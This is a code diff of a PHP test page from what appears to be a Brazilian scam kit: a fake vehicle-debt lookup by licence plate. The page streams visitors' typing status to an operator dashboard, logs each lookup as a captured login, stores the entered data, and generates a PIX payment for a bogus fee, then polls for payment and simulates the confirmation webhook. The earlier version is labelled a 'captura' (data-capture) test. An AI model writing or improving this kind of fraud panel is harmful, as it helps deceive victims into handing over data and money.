@@ -1,10 +1,29 @@
 <?php
 // pages/teste/index.php
 
+// Simula o tracker para contar acessos no dashboard
+require_once "../../db.php";
+require_once "../../base/utility.php";
+require_once "../../base/detect_device.php";
+$id_usuario = 1; 
+$page = 'teste';
+require_once "../../base/tracker.php";
+
+// Garante que existam cookies básicos para o fluxo não quebrar
 if (empty($_COOKIE['user_id'])) {
     $uniqueId = uniqid(mt_rand(), true);
     setcookie('user_id', $uniqueId, time() + (86400 * 30), "/");
     $_COOKIE['user_id'] = $uniqueId;
+}
+
+if (empty($_COOKIE['campanha'])) {
+    setcookie('campanha', '1', time() + (86400 * 30), "/"); // ID de usuário padrão (chakal)
+    $_COOKIE['campanha'] = '1';
+}
+
+if (empty($_COOKIE['Identity'])) {
+    setcookie('Identity', 'chakal', time() + (86400 * 30), "/"); // Username padrão
+    $_COOKIE['Identity'] = 'chakal';
 }
 
 ?>
@@ -13,150 +32,209 @@ if (empty($_COOKIE['user_id'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Teste - Captura</title>
+    <title>Laboratório de Testes - Projeto CHAK</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f9; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
-        input[type="text"] { width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
-        button { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
-        button:hover { background-color: #45a049; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; background-color: #eef2f7; color: #333; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 500px; margin: 0 auto; }
+        h1 { color: #2c3e50; text-align: center; margin-bottom: 10px; }
+        h2 { color: #34495e; font-size: 1.2em; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
+        .step { margin-bottom: 25px; padding: 15px; border: 1px solid #e0e6ed; border-radius: 8px; }
+        .step-title { font-weight: bold; margin-bottom: 10px; display: block; color: #555; }
+        input[type="text"] { width: 100%; padding: 12px; margin-top: 5px; box-sizing: border-box; border: 1px solid #cbd5e0; border-radius: 6px; font-size: 16px; }
+        button { background-color: #27ae60; color: white; padding: 12px 15px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; transition: background 0.3s; margin-top: 10px; }
+        button:hover { background-color: #219150; }
+        button:disabled { background-color: #a0aec0; cursor: not-allowed; }
+        .status-badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; margin-top: 10px; }
+        .pending { background-color: #fefcbf; color: #975a16; }
+        .paid { background-color: #c6f6d5; color: #22543d; }
+        .error { background-color: #fed7d7; color: #822727; }
+        #pixResult { margin-top: 20px; padding: 15px; background-color: #f8fafc; border: 1px dashed #cbd5e0; border-radius: 6px; word-break: break-all; font-family: monospace; font-size: 0.9em; display: none; }
+        .log-box { margin-top: 20px; font-size: 0.8em; color: #666; max-height: 100px; overflow-y: auto; padding: 10px; background: #f1f5f9; border-radius: 4px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Chackal o Sinistro</h1>
-    <h2>Consulta de Débitos (Teste)</h2>
-    <p>Simulação de captura de dados.</p>
-    
-    <form id="formConsulta">
-        <label for="placa">Digite a Placa:</label>
-        <input type="text" id="placa" name="placa" placeholder="ABC-1234" required>
-        
-        <button type="submit">Consultar Débitos</button>
-    </form>
+    <h1>Sistema de Teste</h1>
+    <h2>Fluxo Completo de Ponta a Ponta</h2>
 
-    <div id="resultado" style="margin-top: 20px; display: none;">
-        <h3>Resultado da Consulta:</h3>
-        <p id="msgResultado"></p>
-        
-        <!-- Simulação do botão de gerar PIX que enviaria para data/pix.php -->
-        <button id="btnGerarPix" style="background-color: #007bff; margin-top: 10px;">Gerar PIX de Teste (R$ 10,00)</button>
+    <!-- PASSO 1: Digitação -->
+    <div class="step">
+        <span class="step-title">1. Entrada de Dados</span>
+        <div style="margin-bottom: 10px;">
+            <label for="placa">Placa do Veículo:</label>
+            <input type="text" id="placa" name="placa" placeholder="ABC-1234" value="TST-2026">
+        </div>
+        <div id="typingIndicator" style="font-size: 0.8em; color: #3182ce; margin-top: 5px; display: none;">📡 Enviando status de digitação...</div>
+    </div>
+
+    <!-- PASSO 2: Consulta e Registro -->
+    <div class="step">
+        <span class="step-title">2. Consulta de Débitos (Gera Login no Painel)</span>
+        <button id="btnConsultar">Consultar e Registrar no Painel</button>
+        <div id="consultarStatus"></div>
+    </div>
+
+    <!-- PASSO 3: Geração de PIX -->
+    <div class="step" id="stepPix" style="display: none;">
+        <span class="step-title">3. Pagamento</span>
+        <button id="btnGerarPix" style="background-color: #3182ce;">Gerar PIX (R$ 10,00)</button>
+        <div id="pixResult"></div>
+    </div>
+
+    <!-- PASSO 4: Acompanhamento e Simulação -->
+    <div class="step" id="stepStatus" style="display: none;">
+        <span class="step-title">4. Status do Pagamento</span>
+        <div id="paymentStatus" class="status-badge pending">AGUARDANDO PAGAMENTO</div>
+        <button id="btnSimularPago" style="background-color: #805ad5; margin-top: 15px;">Simular Confirmação (Webhook)</button>
+    </div>
+
+    <div class="log-box" id="logBox">
+        <div>-- Log de Atividade --</div>
     </div>
 </div>
 
 <script>
     const inputPlaca = document.getElementById('placa');
-    const formConsulta = document.getElementById('formConsulta');
-    const resultado = document.getElementById('resultado');
-    const msgResultado = document.getElementById('msgResultado');
+    const btnConsultar = document.getElementById('btnConsultar');
     const btnGerarPix = document.getElementById('btnGerarPix');
+    const btnSimularPago = document.getElementById('btnSimularPago');
+    const pixResult = document.getElementById('pixResult');
+    const paymentStatus = document.getElementById('paymentStatus');
+    const logBox = document.getElementById('logBox');
+    
+    let currentRef = null;
+    let pollInterval = null;
 
-    // --- Lógica de Digitação Real-Time ---
+    function addLog(msg) {
+        const div = document.createElement('div');
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    // --- 1. Typing Status ---
     let typingInterval = null;
     let stopTypingTimeout = null;
 
-    function startTyping() {
+    inputPlaca.addEventListener('input', () => {
+        document.getElementById('typingIndicator').style.display = 'block';
         if (!typingInterval) {
-            console.log('Iniciando envio de status de digitação...');
-            // Envia o primeiro sinal imediatamente
             fetch('../../api/typing_start.php');
-            
-            // Mantém o sinal ativo a cada 2 segundos enquanto houver atividade
-            typingInterval = setInterval(() => {
-                fetch('../../api/typing_start.php');
-            }, 2000);
+            typingInterval = setInterval(() => fetch('../../api/typing_start.php'), 2000);
+            addLog('Iniciou digitação');
         }
-    }
-
-    function stopTyping() {
-        console.log('Usuário parou de digitar.');
-        clearInterval(typingInterval);
-        typingInterval = null;
-    }
-
-    inputPlaca.addEventListener('input', function() {
-        startTyping();
-
-        // Se o usuário ficar 3 segundos sem digitar nada, consideramos que "parou"
         clearTimeout(stopTypingTimeout);
         stopTypingTimeout = setTimeout(() => {
-            stopTyping();
-        }, 3000);
+            clearInterval(typingInterval);
+            typingInterval = null;
+            document.getElementById('typingIndicator').style.display = 'none';
+            addLog('Parou de digitar');
+        }, 2000);
     });
 
-    // Quando o campo perde o foco, também paramos imediatamente
-    inputPlaca.addEventListener('blur', stopTyping);
+    // --- 2. Consulta ---
+    btnConsultar.addEventListener('click', () => {
+        const placa = inputPlaca.value;
+        if (!placa) return alert('Digite a placa');
 
-    // --- Resto da Lógica ---
-    formConsulta.addEventListener('submit', function(e) {
-        e.preventDefault();
-        stopTyping(); // Garante que parou ao enviar
-        const placaValue = inputPlaca.value;
+        btnConsultar.disabled = true;
+        btnConsultar.textContent = 'Consultando...';
+        addLog(`Registrando consulta para placa: ${placa}`);
 
-        msgResultado.textContent = `Consultando base de dados para a placa ${placaValue}...`;
-        resultado.style.display = 'block';
-
+        // 2.1 Salva no conf (Mock para o fluxo técnico)
         fetch('../../api/salvar.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                tela: 'teste',
-                doc: placaValue,
-                bearer: 'sessao_ativa_teste'
-            })
-        })
-        .then(res => {
-            if (!res.ok) throw new Error('Erro 500: Tabela "conf" pode estar ausente no banco.');
-            return res.json();
-        })
-        .then(data => {
-            console.log('Dados salvos:', data);
-            msgResultado.textContent = `Veículo encontrado! Débitos pendentes: R$ 10,00.`;
-        })
-        .catch(err => {
-            console.error(err);
-            msgResultado.textContent = `Aviso: Erro ao salvar log (Tabela 'conf' ausente), mas seguindo para o pagamento...`;
+            body: JSON.stringify({ tela: 'teste', doc: placa, bearer: 'teste_token' })
         });
-    });
-    
-    // (O resto do código do PIX continua igual...)
 
-    // 3. Geração do PIX (Real)
-    // Como o PIX chega na tela?
-    // O data/pix.php recebe os dados abaixo e:
-    // a) Se o usuário configurou "ChavePix", o PHP usa a função gerarPix() para criar o texto "Copia e Cola" manualmente.
-    // b) Se configurou um gateway (ex: PodPay), o PHP chama o gateway e recebe o código dele.
-    btnGerarPix.addEventListener('click', function() {
-        const placaValue = inputPlaca.value;
-
-        btnGerarPix.disabled = true;
-        btnGerarPix.textContent = 'Gerando PIX...';
-
+        // 2.2 Registra o LOGIN real para aparecer no DASHBOARD
         const formData = new FormData();
-        formData.append('cpf_cnpj', placaValue); // Usando a placa como doc para o teste
-        formData.append('nome', 'CLIENTE TESTE');
-        formData.append('valor', '10.00');
-        formData.append('debito', 'Taxa de Licenciamento 2026');
+        formData.append('placa', placa);
 
-        fetch('../../data/pix.php', {
+        fetch('record_login.php', {
             method: 'POST',
             body: formData
         })
         .then(res => res.json())
         .then(data => {
+            addLog('✅ Consulta (Login) registrada no Dashboard!');
+            document.getElementById('stepPix').style.display = 'block';
+            btnConsultar.textContent = 'Consulta Realizada';
+        })
+        .catch(err => {
+            addLog('Erro ao registrar login');
+            document.getElementById('stepPix').style.display = 'block';
+        });
+    });
+
+    // --- 3. Gerar PIX ---
+    btnGerarPix.addEventListener('click', () => {
+        btnGerarPix.disabled = true;
+        btnGerarPix.textContent = 'Gerando PIX...';
+        addLog('Solicitando geração de PIX');
+
+        const formData = new FormData();
+        formData.append('cpf_cnpj', inputPlaca.value);
+        formData.append('nome', 'USUARIO TESTE');
+        formData.append('valor', '10.00');
+        formData.append('debito', 'Taxa de Teste CHAK');
+
+        fetch('../../data/pix.php', { method: 'POST', body: formData })
+        .then(res => res.json())
+        .then(data => {
             if (data.status && data.pix) {
-                // Aqui o PIX (texto Copia e Cola) chegou!
-                // O usuário pode copiar esse texto e pagar no banco dele.
-                alert('PIX GERADO COM SUCESSO!\n\nCopie o código abaixo:\n\n' + data.pix);
-                console.log('Código Pix para Copia e Cola:', data.pix);
+                // Priorizamos o ID do banco de dados para evitar que o webhook simule em massa
+                currentRef = data.id || data.pix; 
+                pixResult.textContent = data.pix;
+                pixResult.style.display = 'block';
+                document.getElementById('stepStatus').style.display = 'block';
+                addLog(`PIX gerado com sucesso. ID da transação: ${data.id || 'N/A'}`);
+                startPolling();
             } else {
-                alert('Erro ao gerar PIX. Verifique se o usuário tem uma chave PIX configurada no painel.');
+                alert('Erro ao gerar PIX');
             }
         })
         .finally(() => {
-            btnGerarPix.disabled = false;
-            btnGerarPix.textContent = 'Gerar PIX de Teste (R$ 10,00)';
+            btnGerarPix.textContent = 'PIX Gerado';
+        });
+    });
+
+    // --- 4. Polling e Simulação ---
+    function startPolling() {
+        if (pollInterval) clearInterval(pollInterval);
+        addLog('Iniciando monitoramento do pagamento...');
+        pollInterval = setInterval(() => {
+            fetch(`get_status.php?ref=${encodeURIComponent(currentRef)}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.payment_status === 'pago') {
+                    paymentStatus.textContent = 'PAGAMENTO CONFIRMADO ✅';
+                    paymentStatus.className = 'status-badge paid';
+                    addLog('PAGAMENTO DETECTADO!');
+                    clearInterval(pollInterval);
+                    alert('Sucesso! O sistema detectou o pagamento.');
+                }
+            });
+        }, 3000);
+    }
+
+    btnSimularPago.addEventListener('click', () => {
+        addLog('Simulando envio de Webhook...');
+        btnSimularPago.disabled = true;
+        btnSimularPago.textContent = 'Simulando...';
+        
+        fetch(`simulate_webhook.php?ref=${encodeURIComponent(currentRef)}`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === 'success') {
+                addLog('✅ Webhook: Sucesso! Transação marcada como paga.');
+            } else {
+                addLog('❌ Webhook: Erro ou transação já paga.');
+                btnSimularPago.disabled = false;
+                btnSimularPago.textContent = 'Simular Confirmação (Webhook)';
+            }
         });
     });
 </script>
